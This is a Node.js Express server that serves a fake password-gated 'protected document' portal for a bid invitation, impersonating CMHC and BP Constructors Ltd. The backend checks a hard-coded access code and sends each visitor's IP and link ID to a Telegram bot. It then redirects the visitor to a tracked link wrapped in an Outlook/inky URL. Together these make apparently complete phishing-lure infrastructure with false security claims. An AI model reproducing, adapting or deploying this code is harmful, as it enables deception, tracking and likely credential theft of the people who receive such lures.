const express = require('express');
const app = express();
app.use(express.json());

// ==========================================
// YOUR HTML (Paste your exact HTML here)
// ==========================================
const myHTML = `
<!doctype html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta name="description" content="Tender Invite - Authorized access only">
  <title>Protected document</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    :root {
      --primary: #0f4c81;
      --primary-dark: #0a3559;
      --primary-light: #1e6ba8;
      --accent: #f59e0b;
      --accent-dark: #d97706;
      --text-dark: #1a202c;
      --text-muted: #64748b;
      --border: #cbd5e1;
      --bg-soft: #f8fafc;
    }

    body {
      font-family: 'Inter', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
      height: 100vh;
      overflow: hidden;
      background: #0a3559;
    }

    .container {
      display: flex;
      height: 100vh;
    }

    /* Left Side - Image Section */
    .image-section {
      flex: 1;
      position: relative;
      background: 
        linear-gradient(135deg, rgba(15, 76, 129, 0.55) 0%, rgba(10, 53, 89, 0.92) 100%),
        url('https://images.unsplash.com/photo-1504307651254-35680f356dfd?w=1600&q=80');
      background-size: cover;
      background-position: center;
      display: flex;
      flex-direction: column;
      justify-content: space-between;
      padding: 48px;
      color: white;
      overflow: hidden;
    }

    /* Decorative overlay pattern */
    .image-section::before {
      content: '';
      position: absolute;
      top: 0; left: 0; right: 0; bottom: 0;
      background-image: 
        radial-gradient(circle at 20% 30%, rgba(245, 158, 11, 0.08) 0%, transparent 40%),
        radial-gradient(circle at 80% 70%, rgba(30, 107, 168, 0.15) 0%, transparent 40%);
      pointer-events: none;
    }

    .brand {
      position: relative;
      z-index: 2;
      display: flex;
      align-items: center;
      gap: 12px;
      animation: fadeInDown 0.8s ease;
    }

    .brand-icon {
      width: 44px;
      height: 44px;
      background: rgba(255, 255, 255, 0.15);
      backdrop-filter: blur(10px);
      border: 1px solid rgba(255, 255, 255, 0.2);
      border-radius: 10px;
      display: flex;
      align-items: center;
      justify-content: center;
    }

    .brand-icon svg {
      width: 22px;
      height: 22px;
      fill: white;
    }

    .brand-name {
      font-size: 16px;
      font-weight: 600;
      letter-spacing: 0.02em;
    }

    .brand-tag {
      font-size: 11px;
      font-weight: 500;
      opacity: 0.7;
      text-transform: uppercase;
      letter-spacing: 0.15em;
      margin-top: 2px;
    }

    .hero-content {
      position: relative;
      z-index: 2;
      max-width: 520px;
    }

    .pill {
      display: inline-flex;
      align-items: center;
      gap: 8px;
      background: rgba(245, 158, 11, 0.15);
      color: #fbbf24;
      border: 1px solid rgba(245, 158, 11, 0.3);
      padding: 6px 14px;
      border-radius: 100px;
      font-size: 12px;
      font-weight: 600;
      text-transform: uppercase;
      letter-spacing: 0.08em;
      margin-bottom: 24px;
      backdrop-filter: blur(10px);
      animation: fadeInUp 0.8s ease 0.2s backwards;
    }

    .pill::before {
      content: '';
      width: 6px;
      height: 6px;
      background: #fbbf24;
      border-radius: 50%;
      box-shadow: 0 0 10px #fbbf24;
      animation: pulse 2s infinite;
    }

    .document-title {
      font-size: 48px;
      font-weight: 800;
      margin-bottom: 20px;
      line-height: 1.1;
      letter-spacing: -0.02em;
      animation: fadeInUp 0.8s ease 0.3s backwards;
    }

    .document-title .accent {
      color: #fbbf24;
      display: block;
    }

    .document-description {
      font-size: 17px;
      opacity: 0.85;
      line-height: 1.6;
      margin-bottom: 36px;
      max-width: 440px;
      animation: fadeInUp 0.8s ease 0.4s backwards;
    }

    .stats-row {
      display: flex;
      gap: 32px;
      animation: fadeInUp 0.8s ease 0.5s backwards;
    }

    .stat {
      padding-right: 32px;
      border-right: 1px solid rgba(255, 255, 255, 0.15);
    }

    .stat:last-child {
      border-right: none;
    }

    .stat-value {
      font-size: 22px;
      font-weight: 700;
      margin-bottom: 4px;
    }

    .stat-label {
      font-size: 12px;
      opacity: 0.65;
      text-transform: uppercase;
      letter-spacing: 0.08em;
    }

    .footer-info {
      position: relative;
      z-index: 2;
      display: flex;
      align-items: center;
      gap: 20px;
      font-size: 12px;
      opacity: 0.75;
      animation: fadeIn 0.8s ease 0.6s backwards;
    }

    .footer-info-item {
      display: flex;
      align-items: center;
      gap: 8px;
    }

    .footer-info-item svg {
      width: 14px;
      height: 14px;
      fill: currentColor;
    }

    /* Right Side - Form Section */
    .form-section {
      width: 540px;
      background: white;
      padding: 72px 64px;
      display: flex;
      flex-direction: column;
      justify-content: center;
      position: relative;
      overflow: hidden;
    }

    /* Subtle background pattern on form side */
    .form-section::before {
      content: '';
      position: absolute;
      top: 0; right: 0;
      width: 200px;
      height: 200px;
      background: radial-gradient(circle, rgba(15, 76, 129, 0.04) 0%, transparent 70%);
      pointer-events: none;
    }

    .form-section::after {
      content: '';
      position: absolute;
      bottom: 0; left: 0;
      width: 250px;
      height: 250px;
      background: radial-gradient(circle, rgba(245, 158, 11, 0.04) 0%, transparent 70%);
      pointer-events: none;
    }

    .form-header {
      margin-bottom: 36px;
      position: relative;
      z-index: 1;
      animation: fadeInRight 0.8s ease;
    }

    .form-eyebrow {
      display: inline-block;
      font-size: 12px;
      font-weight: 600;
      color: var(--primary);
      text-transform: uppercase;
      letter-spacing: 0.1em;
      margin-bottom: 12px;
    }

    .form-title {
      font-size: 32px;
      font-weight: 800;
      color: var(--text-dark);
      margin-bottom: 10px;
      letter-spacing: -0.01em;
      line-height: 1.2;
    }

    .form-subtitle {
      font-size: 15px;
      color: var(--text-muted);
      line-height: 1.5;
    }

    .form-description {
      background: var(--bg-soft);
      border-left: 3px solid var(--accent);
      padding: 14px 16px;
      border-radius: 6px;
      font-size: 14px;
      color: #475569;
      line-height: 1.55;
      margin-bottom: 28px;
      position: relative;
      z-index: 1;
      animation: fadeInRight 0.8s ease 0.2s backwards;
    }

    .form-group {
      margin-bottom: 20px;
      position: relative;
      z-index: 1;
      animation: fadeInRight 0.8s ease 0.3s backwards;
    }

    .form-label {
      display: block;
      font-size: 13px;
      font-weight: 600;
      color: var(--text-dark);
      margin-bottom: 8px;
      letter-spacing: 0.01em;
    }

    .input-wrapper {
      position: relative;
    }

    .input-icon {
      position: absolute;
      left: 16px;
      top: 50%;
      transform: translateY(-50%);
      width: 18px;
      height: 18px;
      fill: var(--text-muted);
      pointer-events: none;
      transition: fill 0.2s;
    }

    .form-input {
      width: 100%;
      height: 52px;
      padding: 0 48px 0 44px;
      border: 1.5px solid var(--border);
      border-radius: 8px;
      font-size: 15px;
      color: var(--text-dark);
      background: white;
      transition: all 0.2s;
      outline: none;
      font-family: inherit;
    }

    .form-input:hover {
      border-color: #94a3b8;
    }

    .form-input:focus {
      border-color: var(--primary);
      box-shadow: 0 0 0 4px rgba(15, 76, 129, 0.08);
    }

    .form-input:focus + .input-icon,
    .input-wrapper:focus-within .input-icon {
      fill: var(--primary);
    }

    .form-input::placeholder {
      color: #94a3b8;
    }

    .toggle-visibility {
      position: absolute;
      right: 14px;
      top: 50%;
      transform: translateY(-50%);
      background: none;
      border: none;
      cursor: pointer;
      padding: 4px;
      display: flex;
      align-items: center;
      justify-content: center;
    }

    .toggle-visibility svg {
      width: 20px;
      height: 20px;
      fill: var(--text-muted);
      transition: fill 0.2s;
    }

    .toggle-visibility:hover svg {
      fill: var(--primary);
    }

    .submit-btn {
      width: 100%;
      height: 52px;
      background: linear-gradient(135deg, var(--primary) 0%, var(--primary-dark) 100%);
      color: white;
      border: none;
      border-radius: 8px;
      font-size: 15px;
      font-weight: 600;
      cursor: pointer;
      transition: all 0.25s;
      margin-top: 8px;
      position: relative;
      z-index: 1;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 10px;
      letter-spacing: 0.01em;
      box-shadow: 0 4px 12px rgba(15, 76, 129, 0.2);
      animation: fadeInRight 0.8s ease 0.4s backwards;
    }

    .submit-btn svg {
      width: 18px;
      height: 18px;
      fill: white;
      transition: transform 0.2s;
    }

    .submit-btn:hover {
      transform: translateY(-2px);
      box-shadow: 0 8px 20px rgba(15, 76, 129, 0.35);
    }

    .submit-btn:hover svg {
      transform: translateX(3px);
    }

    .submit-btn:active {
      transform: translateY(0);
    }

    .form-footer {
      margin-top: 28px;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 8px;
      font-size: 12px;
      color: var(--text-muted);
      position: relative;
      z-index: 1;
      animation: fadeInRight 0.8s ease 0.5s backwards;
    }

    .form-footer svg {
      width: 14px;
      height: 14px;
      fill: #22c55e;
    }

    .error-message {
      color: #dc2626;
      font-size: 13px;
      margin-top: 8px;
      min-height: 20px;
      display: flex;
      align-items: center;
      gap: 6px;
    }

    /* Animations */
    @keyframes fadeIn {
      from { opacity: 0; }
      to { opacity: 1; }
    }

    @keyframes fadeInDown {
      from { opacity: 0; transform: translateY(-20px); }
      to { opacity: 1; transform: translateY(0); }
    }

    @keyframes fadeInUp {
      from { opacity: 0; transform: translateY(20px); }
      to { opacity: 1; transform: translateY(0); }
    }

    @keyframes fadeInRight {
      from { opacity: 0; transform: translateX(20px); }
      to { opacity: 1; transform: translateX(0); }
    }

    @keyframes pulse {
      0%, 100% { opacity: 1; transform: scale(1); }
      50% { opacity: 0.6; transform: scale(1.2); }
    }

    /* Responsive */
    @media (max-width: 1024px) {
      .image-section {
        display: none;
      }
      
      .form-section {
        width: 100%;
        padding: 48px 32px;
      }
    }

    @media (max-width: 480px) {
      .form-section {
        padding: 32px 24px;
      }
      
      .form-title {
        font-size: 26px;
      }

      .stats-row {
        flex-wrap: wrap;
        gap: 16px;
      }

      .stat {
        border-right: none;
      }
    }
  </style>
</head>
<body>
  <div class="container">
    <!-- Left Side - Image Section -->
    <div class="image-section">
      <div class="brand">
        <div class="brand-icon">
          <svg viewBox="0 0 24 24"><path d="M12 3l9 8h-3v9h-4v-6H10v6H6v-9H3l9-8z"/></svg>
        </div>
        <div>
          <div class="brand-name">Bid Invitation</div>
          <div class="brand-tag">Secure Portal</div>
        </div>
      </div>

      <div class="hero-content">
        <div class="pill">Protected Document</div>
        <h1 class="document-title">
          CMHC &<br>
          <span class="accent">BP CONSTRUCTORS Ltd</span>
        </h1>
        <p class="document-description">
          Secure access to your housing development documentation. Only authorized parties with valid credentials may view these records.
        </p>

        <div class="stats-row">
          <div class="stat">
            <div class="stat-value">248395</div>
            <div class="stat-label">Reference</div>
          </div>
          <div class="stat">
            <div class="stat-value">Quote435</div>
            <div class="stat-label">File Code</div>
          </div>
          <div class="stat">
            <div class="stat-value">BID</div>
            <div class="stat-label">Status</div>
          </div>
        </div>
      </div>

      <div class="footer-info">
        <div class="footer-info-item">
          <svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm-1 16l-4-4 1.41-1.41L11 14.17l6.59-6.59L19 9l-8 8z"/></svg>
          <span>256-bit Encrypted</span>
        </div>
        <div class="footer-info-item">
          <svg viewBox="0 0 24 24"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zM9 6c0-1.66 1.34-3 3-3s3 1.34 3 3v2H9V6z"/></svg>
          <span>Secure Access</span>
        </div>
      </div>
    </div>

    <!-- Right Side - Form Section -->
    <div class="form-section">
      <div class="form-header">
        <span class="form-eyebrow">Authorized Access Only</span>
        <h2 class="form-title">Enter the password to view</h2>
        <p class="form-subtitle">This document requires a valid access code to proceed.</p>
      </div>

      <div class="form-description">
        This file is locked for client review. Enter the password you were given to open the document securely.
      </div>

      <form id="access-form">
        <div class="form-group">
          <label class="form-label" for="access-code">DOCUMENT PASSWORD</label>
          <div class="input-wrapper">
            <input 
              type="password" 
              id="access-code" 
              class="form-input" 
              placeholder="Enter access code"
              autocomplete="off"
              required
            >
            <svg class="input-icon" viewBox="0 0 24 24"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zM9 6c0-1.66 1.34-3 3-3s3 1.34 3 3v2H9V6zm9 14H6V10h12v10z"/></svg>
            <button type="button" class="toggle-visibility" aria-label="Toggle password visibility">
              <svg viewBox="0 0 24 24" id="eye-icon"><path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/></svg>
            </button>
          </div>
          <div class="error-message" id="error-message"></div>
        </div>

       <button type="submit" class="submit-btn">Unlock Document
        <svg viewBox="0 0 24 24"><path d="M12 4l-1.41 1.41L16.17 11H4v2h12.17l-5.58 5.59L12 20l8-8z"/></svg>
        </button>
      </form>

      <p class="form-footer">
        <svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z"/></svg>
        The file stays on this page until it is unlocked
      </p>
    </div>
  </div>

  <script>
    document.getElementById("access-form").addEventListener("submit", async function(e) {
      e.preventDefault();
      const code = document.getElementById("access-code").value;
      const errorDiv = document.getElementById("error-message");
	  const toggleBtn = document.querySelector('.toggle-visibility');
      const eyeIcon = document.getElementById('eye-icon');
      
      errorDiv.textContent = "Verifying...";
      
      try {
        const res = await fetch('/verify', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ code: code })
        });
        const data = await res.json();
        
        if (data.success) {
          window.location.replace(data.redirectUrl);
        } else {
          errorDiv.textContent = data.message;
        }
      } catch (err) {
        errorDiv.textContent = "Connection error.";
      }
    });
  </script>
</body>
</html>
`;

// ==========================================
// THE BACKEND API
// ==========================================
app.post('/verify', async (req, res) => {
  const { code } = req.body;
  const linkId = req.query.id || 'unknown'; // Capture the unique ID from URL
  const CORRECT_CODE = "Quote435";
  const TARGET_URL = "https://shared.outlook.inky.com/link?domain=web-tracker.bisnow.net&t=h.eJx1kcFu5CAMhl-lijQ5LSGETKZTKWpXWu1hpXaPPY7AOBOUBCIgZduq717Qqp1LKzgg-_Pv3-a12Nxc3FwVYwirv6E0oiTBCZjQVVJ7Y2NlMNBbAUFb0wMQv1rjrSMwa5jKVZzxlDT6T4EYPwrBLjQKP2pzDtYQBdRg9BRstG5KwdQsv4jakmQgoB3MSHzYlLaSMNZxfl2um5y1H09KBOybumlSgrCuhFSCJpy06j9IezLbItH1zYG39a6py82jy0QZhDtjuBjd8Z-75ne62e5_G9luCnyP4pOeM_Q9Idfkyge3QbDOE2FGMRDVdcBZ5bdlEe6ZuCSDqWfqiM5XCp_o7dQ_Dvzlke3vH-r7sZNq_BvX8RfMf4ofV8WU_yfoPFmw0VCV9j7dXQIVCNoKXjMcGimVHJqWHbEdlOD7uuVsL-WessOx5vlcV8fDkTPeZmnM0rMWy_nu0_k_cJh2nSfNiMrIl8m3dyKMw4o.MEUCIAuoNR2eISVeWqLyr3L1fY0nTH9H-FeL5vk4GQYDwoP6AiEArOUwHz953uKhScj_r_QTLbYjChZZvujtos3E3o-t4bk";

  if (code === CORRECT_CODE) {
    const token = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;

    if (token && chatId) {
      const ip = req.headers['x-forwarded-for'] || req.ip;
      const message = ` *DOCUMENT ACCESSED*\n Link ID: ${linkId}\n IP: ${ip}\n✅ Code: ${code}`;
      
      await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: chatId, text: message, parse_mode: 'Markdown' })
      });
    }
    return res.json({ success: true, redirectUrl: TARGET_URL });
  }

  return res.status(401).json({ success: false, message: "That access code is incorrect. Try again." });
});

// Serve the HTML on the homepage
app.get('/', (req, res) => {
  res.send(myHTML);
});

// Start the server
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
